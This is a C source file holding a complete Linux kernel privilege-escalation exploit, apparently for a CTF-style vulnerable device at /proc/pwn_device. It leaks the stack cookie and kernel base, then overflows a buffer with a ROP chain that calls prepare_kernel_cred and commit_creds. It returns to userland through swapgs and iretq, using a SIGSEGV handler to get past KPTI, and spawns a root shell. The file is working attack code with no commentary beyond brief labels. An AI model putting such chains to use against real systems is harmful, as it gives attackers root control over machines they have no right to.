#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>

void spawn_shell() {
	puts("[+] Returned to userland");

	if (getuid() == 0) system("/bin/sh");
	else puts("[-] Not root");
}

unsigned long user_cs, user_ss, user_rflags, user_rsp;
int main() {
	// KPTI bypass
	signal(SIGSEGV, spawn_shell);

	int fd = open("/proc/pwn_device", O_RDWR);
	if (fd < 0) {
		puts("[-] Failed to open device");
		exit(1);
	}
	puts("[+] Opened device");

	// Leak
	unsigned long buff[80] = {0};
	read(fd, buff, 64);

	unsigned long cookie = buff[5];
	unsigned long base = buff[7] - 0x25de2e;
	printf("[+] Leaked cookie: 0x%lx\n", cookie);
	printf("[+] Leaked base: 0x%lx\n", base);

	// Save state
	__asm__(
			".intel_syntax noprefix;"
			"mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_rsp, rsp;"
			"pushf;"
			"pop user_rflags;"
			".att_syntax;"
		   );

	// Overflow
	unsigned long payload[40] = {[0 ... 39] = 0x4141414141414141};
	int i = 5;
	payload[i] = cookie;
	++i;
	payload[++i] = base + 0x001778; // pop rdi; ret; 
	payload[++i] = 0x0;
	payload[++i] = base + 0x08c340; // prepare_kernel_cred
	payload[++i] = base + 0x08bf00; // commit_creds
	payload[++i] = base + 0xc00f58; // swapgs; ret; 
	payload[++i] = base + 0x024952; // iretq; ret; 
	payload[++i] = (unsigned long)spawn_shell; // userland rip
	payload[++i] = user_cs;
	payload[++i] = user_rflags;
	payload[++i] = user_rsp;
	payload[++i] = user_ss;

	write(fd, payload, sizeof payload);

	return 0;
}
